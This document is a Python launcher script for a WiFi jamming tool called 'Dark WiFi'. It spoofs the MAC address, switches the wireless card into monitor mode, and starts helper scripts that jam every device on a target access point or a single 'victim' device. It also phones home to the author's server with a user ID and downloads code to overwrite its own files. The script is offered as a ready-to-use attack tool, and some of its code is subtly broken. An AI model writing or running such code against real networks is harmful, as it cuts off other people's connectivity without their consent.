import os
import netifaces
import random
import time
import subprocess
import requests
import sys
Red = '\033[1;31m'
Blue= '\033[1;36m'
Endc = '\033[0m'

line = "----------------------------------------------------------"
verl = open("core/.version", 'r').read()

def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
use_tim = ''
def get_id():
    clr()
    global use_tim 
    id_path = 'core/.da'
    id_check = open(id_path,'a')
    id_read = open(id_path,'r')
    id = id_read.read()
    if id:
        try:
            data = { 'id': id }
            url = 'https://honeypots.tech/p/Dark-WiFi/user/use.php'
            r = requests.get(url=url , params=data)
            s_code = r.status_code
            if int(s_code) == 200 :
                use_time = r.text
                use_time = use_time.strip()
            else:
                pass
        except:
            pass
    else:
        header = ''
        url = 'https://honeypots.tech/p/Dark-WiFi/user/id.php'
        r = requests.get(url=url, headers=header)
        id_gen = r.text
        if len(id_gen) <= 50 :
            id_gen = id_gen.strip()
            id_gen = str(id_gen)
            use_time = str(1)
            id_check.write(id_gen)
            id = id_gen
        else :
            pass
    if id:
        pass
    else:
        pass

    if use_time:
        pass
    else:
        banner()
        print('\n\tYour I\'D Invalid \n\n       Please Reinstall Dark WiFi Tool ')
        print('\n\t     Error : 507\n')
        print(line)
        print(Red+'\n\t\t[ Sub Menu ]')
        print(Blue +'''\n[01] Contact To Developer\n[02] Reinstall Dark WiFi Tool''')
        error503 = input('\nChoose One Options : ')
        if error503 == 1:
            subprocess.call([sys.executable, 'core/contact.py'])
        else: 
            os.system("pip3 install -r requirements.txt")

            subprocess.call([sys.executable, 'dark-wifi.py'])      
    id = id.strip()
    use_tim = use_time

def banner():
    clr()
    logo="""
________              ______      ___       ____________________ 
___  __ \_____ __________  /__    __ |     / /__(_)__  ____/__(_)
__  / / /  __ `/_  ___/_  //_/    __ | /| / /__  /__  /_   __  / 
_  /_/ // /_/ /_  /   _  ,<       __ |/ |/ / _  / _  __/   _  /  
/_____/ \__,_/ /_/    /_/|_|      ____/|__/  /_/  /_/      /_/   
                                                                                                                                                                                     
   """,f"""
----------------------     -------------------------------
|      SecAnon       |     |   Version : {verl}     |
----------------------     -------------------------------

\t        Created by Honey Pots...

---------------------------------------------------------- 
"""
    print(Red+logo[0]+Blue+logo[1])

def main():
    clr()
    id_path = 'core/.da'
    id_check = open(id_path,'a')
    id_read = open(id_path,'r')
    id = id_read.read()
    global use_tim
    logo="""
________              ______      ___       ____________________ 
___  __ \_____ __________  /__    __ |     / /__(_)__  ____/__(_)
__  / / /  __ `/_  ___/_  //_/    __ | /| / /__  /__  /_   __  / 
_  /_/ // /_/ /_  /   _  ,<       __ |/ |/ / _  / _  __/   _  /  
/_____/ \__,_/ /_/    /_/|_|      ____/|__/  /_/  /_/      /_/   
                                                                                                                                                                                     
   """,f"""
----------------------     -------------------------------
|      SecAnon       |     |   Version : {verl}     |
----------------------     -------------------------------

\t        Created by Honey Pots...

---------------------------------------------------------- 
    ID : {id}                            USE : {use_tim} 
---------------------------------------------------------- 
"""
    print(Red+logo[0]+Blue+logo[1])

main()

def update():
    myfile = ('dark-wifi.py','core/conn.py','core/jama.py','core/jams.py' ,'core/macs.py')
    for f in myfile:
        f = str(f)
        req = requests.get("https://raw.githubusercontent.com/HoneyPots0/Dark-WiFi/master/" + f)
        dat = req.text
        file = open(f, 'wb')
        file.write(dat)
        file.close()
    print('\n\t    Updated Successfull !!!')
    input('\n\tPress Enter To Run Again Dark-WiFi Tool: ')
    subprocess.call([sys.executable, 'dark-wifi.py'])
def net_update_active():
    main()
    try:
        r = requests.get('https://www.honeypots.tech')
    except:
            print('\n\t     Your Internet Connection Slow ... ')
            print('\n\t\t     Error : 504\n')
            print(line)
            input('\n\tPress Enter To Continue : ')
    print('\n\t\t    Checking For Updates...')
    ver_r = requests.get(
        "https://raw.githubusercontent.com/HoneyPots0/Dark-WiFi/main/core/.version")
    ver = ver_r.text
    try:
        verl = open("core/.version", 'r').read()
    except:
        pass
    if ver != verl:
        print('\n\t\tNew Version Available : ', ver)
        print('\n\t\t   Tool Start Updating...')
        update()
    print("\n\t\tYour Version is Up-To-Date")
    print('\n\t\t    Starting Dark WiFi Tool ...\n')
    time.sleep(1)

try:
    get_id()
    instl_file = open("core/.install", 'a')
    instl_write = open("core/.install","w")
    os.system("pip3 install -r requirements.txt")
    os.system("sudo apt-get install gnome-terminal")
    instl_write.write("1") 
except:
    banner()
    install_file = open("core/.install", 'a')
    install= open("core/.install","r").read()
    install = install.strip()
    if install :
        print('\n\t     Your Internet Connection Slow ... ')
        print('\n\t\t     Error : 504\n')
        print(line)
        input('\n\tPress Enter To Continue  : ')
    else:
        banner()
        print('\n\t     Your Internet Connection Slow ... ')
        print("\n\t     First Time It's Require Internet ")
        print('\n\t\t     Error : 504\n')
        print(line)
        input('\n\tPress Enter To Run Again : ')
        subprocess.call([sys.executable, 'dark-wifi.py'])   
        install_write = open("core/.install","w")
        install_write.write("1") 





try:
    net_update_active()
except:
    pass

main()

interfaces = netifaces.interfaces()


print(Red+"\t\t        InterFaces Detials\n"+Blue)
num = 1
wifi_list = []
for i in interfaces:
    if i[0:4] != 'wlan':
        continue
    print(f'[{num}] : {i}')
    wifi_list.append(i)
    num +=1

print("\n")     
inp = input("Please Choose Once Options : ")
wifi_sel = wifi_list[int(inp)-1]
addrs = netifaces.ifaddresses(wifi_sel)
details = addrs[netifaces.AF_LINK]
main()

if wifi_sel[-3:] == 'mon' :
    wifi_sel = wifi_sel.replace('mon','')
else:
    pass

print(Red+f"\t\t       {wifi_sel} Detials\n"+Blue)
try:
    print(f"MAC Address : {details[0]['addr'].strip()}")
except:
    pass
yes_no = input("\nDo You Want Change Your MAC Address [Y/N] : ")
yes_no = yes_no.lower().strip()

if yes_no == 'y' or yes_no == 'yes' :
    try:
        print("\n")
        os.system(f"sudo ifconfig {wifi_sel} down")
        os.system(f"sudo macchanger -r {wifi_sel} ")
        os.system(f"sudo ifconfig {wifi_sel} up")
    except:
        pass
else :
    pass

print(line)


print(Red+f"\t\t       {wifi_sel} Monitor Start\n"+Blue,end="")
os.system(f'sudo airmon-ng start {wifi_sel}')
proc = subprocess.call(['gnome-terminal', '-e', f'python3 core/conn.py {wifi_sel}'  ])
main()
print(Red+f"\t\t Your Near All WIFI Details\n"+Blue)
mac = input("Please Enter WiFi Mac Address : ")
mac.strip()
channel = input(f"Please Enter WiFi Channel : ")
channel.strip()

main()
print(Red+f"\t\t       Final Jam WiFi \n"+Blue)
print("""
[1] Jam All WiFi Device
[2] Jam Single  Device 
""")

jam = input("Please Choose Once Option : ")

if int(jam) == 2 :
    main()
    print(Red+f"\t\t       WiFi  Scanning \n"+Blue)
    proc = subprocess.call(['gnome-terminal', '-e', f'python3 core/macs.py {wifi_sel} {mac} {channel}'  ])
    main()
    print(Red+f"\t\t       Final Jam WiFi \n"+Blue)
    single = input("Please Victim Device Mac Address : ")
    single.strip()
    proc = subprocess.call(['gnome-terminal', '-e', f'python3 core/jams.py {wifi_sel} {mac} {single}'  ])
    main()
    print(Red+f"\t\t        WiFi Jamm SuccessFul \n"+Blue)
    input("Please Enter To Stop WiFi Jamming : ")
    subprocess.call([sys.executable, 'core/stop.py'])
else :
    proc = subprocess.call(['gnome-terminal', '-e', f'python3 core/dump_air.py {wifi_sel} {mac} {channel}'  ])
    
    proc = subprocess.call(['gnome-terminal', '-e', f'python3 core/jama.py {wifi_sel} {mac}'  ])
    main()
    print(Red+f"\t\t        WiFi Jamm SuccessFul \n"+Blue)
    input("Please Enter To Stop WiFi Jamming : ")
    subprocess.call([sys.executable, 'core/stop.py'])

